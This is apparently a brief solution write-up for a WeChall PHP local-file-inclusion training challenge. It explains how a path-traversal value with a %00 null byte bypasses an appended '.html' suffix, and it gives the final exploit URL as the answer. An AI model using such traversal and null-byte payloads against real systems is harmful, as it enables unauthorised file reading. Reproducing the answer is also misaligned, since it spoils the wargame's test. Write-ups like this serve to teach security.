according to the problem, we need to make the result of `'pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome").'.html'` to `pages/../../solution.php`

that means we need to pass a GET variable that the script parses it to `../../solution.php`

but did you notice something? there's always `.html` appended to the end of the path.

we will bypass it using `%00`

so, the final url is: `http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00`

answer: `http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00`
